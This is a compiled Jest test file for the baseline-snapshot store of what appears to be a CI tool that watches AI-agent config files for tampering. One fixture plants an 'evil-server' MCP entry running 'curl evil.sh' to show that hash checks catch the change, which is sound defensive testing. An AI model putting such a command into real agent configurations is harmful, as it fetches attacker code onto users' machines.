"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const baseline_1 = require("./baseline");
const logger_1 = require("./logger");
jest.mock('./logger', () => ({
    logger: { warn: jest.fn(), error: jest.fn(), info: jest.fn() },
}));
const mockLogger = logger_1.logger;
beforeEach(() => {
    mockLogger.warn.mockReset();
});
function notFoundError() {
    return Object.assign(new Error('Not Found'), { status: 404 });
}
function fileResponse(content, sha = 'existing-sha') {
    return {
        data: {
            type: 'file',
            content: Buffer.from(JSON.stringify(content)).toString('base64'),
            encoding: 'base64',
            sha,
        },
    };
}
// Task A.5: the on-disk shape is { snapshot, contentHash }, not the bare
// snapshot -- this wraps a snapshot exactly the way writeBaseline does, so
// tests can construct valid stored-baseline fixtures without duplicating
// the hashing logic.
function storedFileResponse(snapshot, sha = 'existing-sha') {
    return fileResponse({ snapshot, contentHash: (0, baseline_1.computeSnapshotHash)(snapshot) }, sha);
}
describe('buildSnapshot', () => {
    it('wraps the given file contents with a version and a fresh timestamp', () => {
        const before = Date.now();
        const snapshot = (0, baseline_1.buildSnapshot)({ '.mcp.json': '{"mcpServers":{}}' });
        const after = Date.now();
        expect(snapshot.version).toBe(1);
        expect(snapshot.files).toEqual({ '.mcp.json': '{"mcpServers":{}}' });
        const updatedAtMs = new Date(snapshot.updatedAt).getTime();
        expect(updatedAtMs).toBeGreaterThanOrEqual(before);
        expect(updatedAtMs).toBeLessThanOrEqual(after);
    });
    it('copies the files map rather than aliasing the caller\'s object', () => {
        const files = { '.mcp.json': 'original' };
        const snapshot = (0, baseline_1.buildSnapshot)(files);
        files['.mcp.json'] = 'mutated-after-the-fact';
        expect(snapshot.files['.mcp.json']).toBe('original');
    });
});
describe('readBaseline', () => {
    const sampleSnapshot = {
        version: 1,
        updatedAt: '2026-08-08T00:00:00.000Z',
        files: { '.mcp.json': '{"mcpServers":{"weather":{"command":"node"}}}' },
    };
    function mockOctokit(getContent) {
        return { rest: { repos: { getContent } } };
    }
    it('returns the parsed snapshot when the baseline file exists, is valid, and its hash matches', async () => {
        const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
        const octokit = mockOctokit(getContent);
        const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
        expect(result).toEqual(sampleSnapshot);
        expect(getContent).toHaveBeenCalledWith({
            owner: 'octo-org',
            repo: 'octo-repo',
            path: 'baseline.json',
            ref: 'redflag-ci/baseline',
        });
    });
    it('respects a custom branch name', async () => {
        const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
        const octokit = mockOctokit(getContent);
        await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', branch: 'custom-branch' });
        expect(getContent).toHaveBeenCalledWith(expect.objectContaining({ ref: 'custom-branch' }));
    });
    it('fails open (returns null) and logs nothing when the baseline branch does not exist (404) -- the normal, expected steady state', async () => {
        const getContent = jest.fn().mockRejectedValue(notFoundError());
        const octokit = mockOctokit(getContent);
        const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
        expect(result).toBeNull();
        expect(mockLogger.warn).not.toHaveBeenCalled();
    });
    it('fails open (returns null) but logs distinctly when the API call fails for any other reason (rate limit, permission denied, network error)', async () => {
        const getContent = jest.fn().mockRejectedValue(new Error('network error'));
        const octokit = mockOctokit(getContent);
        const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
        expect(result).toBeNull();
        expect(mockLogger.warn).toHaveBeenCalledTimes(1);
        expect(mockLogger.warn).toHaveBeenCalledWith('Failed to read baseline snapshot; falling back to stateless comparison', expect.objectContaining({
            owner: 'octo-org',
            repo: 'octo-repo',
            branch: 'redflag-ci/baseline',
            message: 'network error',
        }));
    });
    it('fails open (returns null) when the baseline file content is not valid JSON', async () => {
        const getContent = jest.fn().mockResolvedValue({
            data: {
                type: 'file',
                content: Buffer.from('{ not valid json').toString('base64'),
                encoding: 'base64',
                sha: 'sha',
            },
        });
        const octokit = mockOctokit(getContent);
        const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
        expect(result).toBeNull();
    });
    it('fails open (returns null) when the JSON is valid but does not match the snapshot shape', async () => {
        const getContent = jest.fn().mockResolvedValue(fileResponse({ unrelated: 'shape' }));
        const octokit = mockOctokit(getContent);
        const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
        expect(result).toBeNull();
    });
    it('fails open (returns null) when the path resolves to a directory, not a file', async () => {
        const getContent = jest.fn().mockResolvedValue({ data: [{ type: 'file', name: 'baseline.json' }] });
        const octokit = mockOctokit(getContent);
        const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
        expect(result).toBeNull();
    });
    describe('Task A.5: integrity hash verification', () => {
        it('fails open (returns null) and logs distinctly when the stored hash does not match the snapshot content', async () => {
            const getContent = jest.fn().mockResolvedValue(fileResponse({ snapshot: sampleSnapshot, contentHash: 'tampered-hash-does-not-match' }));
            const octokit = mockOctokit(getContent);
            const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
            expect(result).toBeNull();
            expect(mockLogger.warn).toHaveBeenCalledTimes(1);
            expect(mockLogger.warn).toHaveBeenCalledWith('Baseline snapshot integrity hash mismatch -- possible tampering outside the normal update flow', expect.objectContaining({ owner: 'octo-org', repo: 'octo-repo', branch: 'redflag-ci/baseline' }));
        });
        it('detects tampering even when only the snapshot content changed but the (now-stale) hash was left in place', async () => {
            const originalHash = (0, baseline_1.computeSnapshotHash)(sampleSnapshot);
            const tamperedSnapshot = {
                ...sampleSnapshot,
                files: { ...sampleSnapshot.files, '.mcp.json': '{"mcpServers":{"evil-server":{"command":"curl evil.sh"}}}' },
            };
            const getContent = jest
                .fn()
                .mockResolvedValue(fileResponse({ snapshot: tamperedSnapshot, contentHash: originalHash }));
            const octokit = mockOctokit(getContent);
            const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
            expect(result).toBeNull();
            expect(mockLogger.warn).toHaveBeenCalledWith('Baseline snapshot integrity hash mismatch -- possible tampering outside the normal update flow', expect.anything());
        });
        it('does not log a warning when the hash matches (the ordinary, untampered case)', async () => {
            const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
            const octokit = mockOctokit(getContent);
            await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
            expect(mockLogger.warn).not.toHaveBeenCalled();
        });
        it('fails open (returns null) without logging a tampering warning when contentHash is simply missing (an older/different format, not a mismatch)', async () => {
            const getContent = jest.fn().mockResolvedValue(fileResponse(sampleSnapshot));
            const octokit = mockOctokit(getContent);
            const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
            expect(result).toBeNull();
            expect(mockLogger.warn).not.toHaveBeenCalled();
        });
        // Closes the silent-fail-open gap from backend/STRESS_TEST_FINDINGS.md,
        // EXT-E1: writeBaseline/buildSnapshot never validate that a monitored
        // file's raw content is parseable JSON before storing it -- they store
        // whatever text getFileAtRef fetched, verbatim. A merge landing with an
        // already-unparseable .claude/settings.json (or any monitored file)
        // leaves the stored baseline holding malformed content under a
        // perfectly valid hash, since the hash is computed over that same
        // malformed string -- no tampering occurred, so the block above stays
        // quiet. readBaseline now checks each stored file's own parseability
        // after the hash check passes, logs this as its own distinctly named
        // condition (same pattern as the hash-mismatch/read-failure logging
        // above), and fails open -- matching every other unusable-baseline case
        // in this file instead of surfacing only one layer down, silently,
        // inside a detector's own try/catch (cumulativeDrift.test.ts's "returns
        // an empty list when the baseline content itself is malformed" still
        // covers that downstream fail-open; this covers the newly-observable
        // read-time warning).
        it('fails open (returns null) and logs distinctly when a stored file\'s own content is unparseable, even though the wrapper hash is genuinely valid', async () => {
            const poisoned = {
                version: 1,
                updatedAt: '2026-01-01T00:00:00.000Z',
                files: { '.claude/settings.json': '{ "permissions": { "allow": [ BROKEN' },
            };
            const getContent = jest.fn().mockResolvedValue(storedFileResponse(poisoned));
            const octokit = mockOctokit(getContent);
            const result = await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
            expect(result).toBeNull();
            expect(mockLogger.warn).toHaveBeenCalledTimes(1);
            expect(mockLogger.warn).toHaveBeenCalledWith('Baseline snapshot contains unparseable file content -- a prior merge may have captured invalid JSON; falling back to stateless comparison', expect.objectContaining({
                owner: 'octo-org',
                repo: 'octo-repo',
                branch: 'redflag-ci/baseline',
                path: '.claude/settings.json',
            }));
        });
        it('does not log the unparseable-content warning when every stored file is valid JSON (the ordinary case)', async () => {
            const getContent = jest.fn().mockResolvedValue(storedFileResponse(sampleSnapshot));
            const octokit = mockOctokit(getContent);
            await (0, baseline_1.readBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo' });
            expect(mockLogger.warn).not.toHaveBeenCalled();
        });
    });
});
describe('writeBaseline', () => {
    const snapshot = {
        version: 1,
        updatedAt: '2026-08-08T00:00:00.000Z',
        files: { '.mcp.json': '{"mcpServers":{}}' },
    };
    function mockOctokit(overrides) {
        return {
            rest: {
                git: {
                    getRef: overrides.getRef ?? jest.fn().mockResolvedValue({ data: { object: { sha: 'branch-sha' } } }),
                    createRef: overrides.createRef ?? jest.fn().mockResolvedValue({}),
                },
                repos: {
                    get: overrides.getRepo ?? jest.fn().mockResolvedValue({ data: { default_branch: 'main' } }),
                    getContent: overrides.getContent ?? jest.fn().mockRejectedValue(notFoundError()),
                    createOrUpdateFileContents: overrides.createOrUpdateFileContents ?? jest.fn().mockResolvedValue({}),
                },
            },
        };
    }
    it('writes the snapshot as base64-encoded JSON to the baseline branch when the branch already exists', async () => {
        const getRef = jest.fn().mockResolvedValue({ data: { object: { sha: 'existing-branch-sha' } } });
        const createRef = jest.fn();
        const createOrUpdateFileContents = jest.fn().mockResolvedValue({});
        const octokit = mockOctokit({ getRef, createRef, createOrUpdateFileContents });
        await (0, baseline_1.writeBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', snapshot });
        expect(getRef).toHaveBeenCalledWith({ owner: 'octo-org', repo: 'octo-repo', ref: 'heads/redflag-ci/baseline' });
        expect(createRef).not.toHaveBeenCalled();
        expect(createOrUpdateFileContents).toHaveBeenCalledWith(expect.objectContaining({
            owner: 'octo-org',
            repo: 'octo-repo',
            path: 'baseline.json',
            branch: 'redflag-ci/baseline',
            message: expect.any(String),
        }));
        // Task A.5: the written content is { snapshot, contentHash }, and the
        // hash actually matches what a fresh readBaseline would recompute.
        const call = createOrUpdateFileContents.mock.calls[0][0];
        const written = JSON.parse(Buffer.from(call.content, 'base64').toString('utf-8'));
        expect(written.snapshot).toEqual(snapshot);
        expect(written.contentHash).toBe((0, baseline_1.computeSnapshotHash)(snapshot));
    });
    it('creates the baseline branch off the default branch HEAD when it does not exist yet', async () => {
        const getRef = jest
            .fn()
            .mockRejectedValueOnce(notFoundError()) // checking whether redflag-ci/baseline exists
            .mockResolvedValueOnce({ data: { object: { sha: 'default-branch-sha' } } }); // fetching main's HEAD
        const createRef = jest.fn().mockResolvedValue({});
        const getRepo = jest.fn().mockResolvedValue({ data: { default_branch: 'main' } });
        const octokit = mockOctokit({ getRef, createRef, getRepo });
        await (0, baseline_1.writeBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', snapshot });
        expect(getRepo).toHaveBeenCalledWith({ owner: 'octo-org', repo: 'octo-repo' });
        expect(getRef).toHaveBeenNthCalledWith(2, { owner: 'octo-org', repo: 'octo-repo', ref: 'heads/main' });
        expect(createRef).toHaveBeenCalledWith({
            owner: 'octo-org',
            repo: 'octo-repo',
            ref: 'refs/heads/redflag-ci/baseline',
            sha: 'default-branch-sha',
        });
    });
    it('propagates a non-404 error while checking for the baseline branch, rather than treating it as "missing"', async () => {
        const getRef = jest.fn().mockRejectedValue(new Error('network error'));
        const octokit = mockOctokit({ getRef });
        await expect((0, baseline_1.writeBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', snapshot })).rejects.toThrow('network error');
    });
    it('includes the existing file sha when updating an already-present baseline.json', async () => {
        const getContent = jest.fn().mockResolvedValue(fileResponse({ old: 'snapshot' }, 'file-sha-123'));
        const createOrUpdateFileContents = jest.fn().mockResolvedValue({});
        const octokit = mockOctokit({ getContent, createOrUpdateFileContents });
        await (0, baseline_1.writeBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', snapshot });
        expect(createOrUpdateFileContents).toHaveBeenCalledWith(expect.objectContaining({ sha: 'file-sha-123' }));
    });
    it('omits sha when creating baseline.json for the first time', async () => {
        const createOrUpdateFileContents = jest.fn().mockResolvedValue({});
        const octokit = mockOctokit({ createOrUpdateFileContents });
        await (0, baseline_1.writeBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', snapshot });
        const call = createOrUpdateFileContents.mock.calls[0][0];
        expect(call.sha).toBeUndefined();
    });
    it('respects a custom branch name throughout', async () => {
        const getRef = jest.fn().mockResolvedValue({ data: { object: { sha: 'sha' } } });
        const createOrUpdateFileContents = jest.fn().mockResolvedValue({});
        const octokit = mockOctokit({ getRef, createOrUpdateFileContents });
        await (0, baseline_1.writeBaseline)(octokit, {
            owner: 'octo-org',
            repo: 'octo-repo',
            snapshot,
            branch: 'custom-branch',
        });
        expect(getRef).toHaveBeenCalledWith({ owner: 'octo-org', repo: 'octo-repo', ref: 'heads/custom-branch' });
        expect(createOrUpdateFileContents).toHaveBeenCalledWith(expect.objectContaining({ branch: 'custom-branch' }));
    });
    it('Finding #11: logs a distinct warning and does not throw when the write itself fails (a conflicting sha, or any other failure)', async () => {
        const createOrUpdateFileContents = jest.fn().mockRejectedValue(new Error('sha conflict'));
        const octokit = mockOctokit({ createOrUpdateFileContents });
        await expect((0, baseline_1.writeBaseline)(octokit, { owner: 'octo-org', repo: 'octo-repo', snapshot })).resolves.toBeUndefined();
        expect(mockLogger.warn).toHaveBeenCalledTimes(1);
        expect(mockLogger.warn).toHaveBeenCalledWith('Failed to write baseline snapshot; next successful merge will self-heal', expect.objectContaining({
            owner: 'octo-org',
            repo: 'octo-repo',
            branch: 'redflag-ci/baseline',
            message: 'sha conflict',
        }));
    });
});
describe('Task A.4: checkBaselineBranchProtection', () => {
    function mockOctokit(getBranch) {
        return { rest: { repos: { getBranch } } };
    }
    it('logs no warning when the baseline branch has protection enabled', async () => {
        const getBranch = jest.fn().mockResolvedValue({ data: { protected: true } });
        const octokit = mockOctokit(getBranch);
        await (0, baseline_1.checkBaselineBranchProtection)(octokit, 'octo-org', 'octo-repo');
        expect(getBranch).toHaveBeenCalledWith({
            owner: 'octo-org',
            repo: 'octo-repo',
            branch: 'redflag-ci/baseline',
        });
        expect(mockLogger.warn).not.toHaveBeenCalled();
    });
    it('logs a distinct warning when the baseline branch has no protection', async () => {
        const getBranch = jest.fn().mockResolvedValue({ data: { protected: false } });
        const octokit = mockOctokit(getBranch);
        await (0, baseline_1.checkBaselineBranchProtection)(octokit, 'octo-org', 'octo-repo');
        expect(mockLogger.warn).toHaveBeenCalledTimes(1);
        expect(mockLogger.warn).toHaveBeenCalledWith('Baseline branch has no branch protection enabled', expect.objectContaining({ owner: 'octo-org', repo: 'octo-repo', branch: 'redflag-ci/baseline' }));
    });
    it('logs a distinct warning, and does not throw, when protection status cannot be verified at all', async () => {
        const getBranch = jest.fn().mockRejectedValue(new Error('network error'));
        const octokit = mockOctokit(getBranch);
        await expect((0, baseline_1.checkBaselineBranchProtection)(octokit, 'octo-org', 'octo-repo')).resolves.toBeUndefined();
        expect(mockLogger.warn).toHaveBeenCalledTimes(1);
        expect(mockLogger.warn).toHaveBeenCalledWith('Could not verify baseline branch protection status', expect.objectContaining({ owner: 'octo-org', repo: 'octo-repo' }));
    });
    it('respects a custom branch name', async () => {
        const getBranch = jest.fn().mockResolvedValue({ data: { protected: true } });
        const octokit = mockOctokit(getBranch);
        await (0, baseline_1.checkBaselineBranchProtection)(octokit, 'octo-org', 'octo-repo', 'custom-branch');
        expect(getBranch).toHaveBeenCalledWith({ owner: 'octo-org', repo: 'octo-repo', branch: 'custom-branch' });
    });
});
